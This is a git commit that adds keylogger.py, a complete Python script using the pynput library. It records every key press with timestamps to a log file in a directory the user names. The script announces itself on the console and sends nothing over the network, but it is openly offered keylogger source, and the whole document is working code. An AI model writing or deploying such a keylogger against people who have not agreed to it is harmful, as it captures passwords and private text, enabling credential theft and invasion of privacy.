fc005046ec1e6763f99fff13597623664865cd3e
DrQwerciak <77661984+DrQwerciaks@users.noreply.github.com>
2023-10-28 12:42:38 +0200

    Create keylogger.py BETA

---
+++ keylogger.py
@@ -0,0 +1,47 @@
+import os
+import sys
+import time
+from pynput.keyboard import Key, Listener
+import logging
+
+log_dir = ""
+
+def setup_logging(log_dir):
+    if not os.path.exists(log_dir):
+        os.makedirs(log_dir)
+
+    log_file = os.path.join(log_dir, "keylogs.txt")
+    logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def on_press(key):
+    try:
+        logging.info(str(key))
+    except Exception as e:
+        logging.error("Error in logging key: " + str(e))
+
+def start_keylogger(log_dir):
+    setup_logging(log_dir)
+
+    with Listener(on_press=on_press) as listener:
+        print("Monitoring keyboard input. Press 'Ctrl+C' to stop.")
+        try:
+            listener.join()
+        except KeyboardInterrupt:
+            print("Stopping keyboard monitoring.")
+            sys.exit(0)
+
+def main():
+    if len(sys.argv) != 2:
+        print("Usage: python keylogger.py <log_directory>")
+        sys.exit(1)
+
+    log_dir = sys.argv[1]
+
+    if not os.path.isdir(log_dir):
+        print("The specified log directory does not exist.")
+        sys.exit(1)
+
+    start_keylogger(log_dir)
+
+if __name__ == "__main__":
+    main()
